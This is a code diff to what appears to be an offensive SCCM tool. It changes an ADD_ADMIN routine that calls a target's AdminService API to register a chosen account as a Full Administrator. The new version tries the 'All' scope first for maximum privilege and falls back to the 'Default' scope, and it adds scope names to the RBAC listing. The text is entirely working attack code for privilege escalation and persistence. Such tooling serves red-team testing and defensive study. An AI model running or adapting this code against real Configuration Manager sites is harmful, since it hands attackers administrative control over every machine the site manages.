@@ -317,37 +317,41 @@ class ADD_ADMIN(AdminServiceClient):
     def add(self, targetuser, targetsid):
         self.targetuser = targetuser
         self.targetsid = targetsid
-
-        body = {"LogonName": f"{self.targetuser}", 
-            "AdminSid":f"{self.targetsid}",
-            "Permissions":[{"CategoryID": "SMS00ALL", 
-                            "CategoryTypeID": 29, 
-                            "RoleID":"SMS0001R",
-                            },
-                            {"CategoryID": "SMS00001",
-                            "CategoryTypeID": 1, 
-                            "RoleID":"SMS0001R", 
-                            },
-                            {"CategoryID": "SMS00004", 
-                            "CategoryTypeID": 1, 
-                            "RoleID":"SMS0001R",
-                            }],
-            "DisplayName":f"{self.targetuser}"
-            }
-        
         url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin/"
 
-        try:
-            r = self.http_post(url, json_data=body)
-            if r.status_code == 201:
-                logger.info(f"[+] Successfully added {self.targetuser} as an admin.")
-                results = self.jprint(r.json())
-                logger.debug(results)
-            else:
-                logger.info("[*] Something went wrong")
-                logger.info(r.text)
-        except Exception as e:
+        # Try SMS00ALL ("All" scope) first for maximum privilege,
+        # fall back to SMS00UNA ("Default" scope) if it fails.
+        for scope_id, scope_name in [("SMS00ALL", "All"), ("SMS00UNA", "Default")]:
+            body = {"LogonName": f"{self.targetuser}",
+                "AdminSid":f"{self.targetsid}",
+                "Permissions":[{"CategoryID": scope_id,
+                                "CategoryTypeID": 29,
+                                "RoleID":"SMS0001R",
+                                },
+                                {"CategoryID": "SMS00001",
+                                "CategoryTypeID": 1,
+                                "RoleID":"SMS0001R",
+                                },
+                                {"CategoryID": "SMS00004",
+                                "CategoryTypeID": 1,
+                                "RoleID":"SMS0001R",
+                                }],
+                "DisplayName":f"{self.targetuser}"
+                }
+
+            try:
+                r = self.http_post(url, json_data=body)
+                if r.status_code == 201:
+                    logger.info(f"[+] Successfully added {self.targetuser} as an admin with '{scope_name}' scope.")
+                    results = self.jprint(r.json())
+                    logger.debug(results)
+                    return
+                else:
+                    logger.info(f"[*] Failed to add admin with '{scope_name}' scope, trying fallback..." if scope_id == "SMS00ALL" else f"[*] Something went wrong")
+                    logger.debug(r.text)
+            except Exception as e:
                 print(e)
+                return
 
 
     def delete(self, targetuser):
@@ -413,7 +417,7 @@ class ADD_ADMIN(AdminServiceClient):
         
 
     def show_rbac(self):
-        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$select=LogonName,RoleNames"
+        url = f"https://{self.target_ip}/AdminService/wmi/SMS_Admin?$select=LogonName,RoleNames,CategoryNames"
         try:
             r = self.http_get(url)
             if r.status_code == 200:
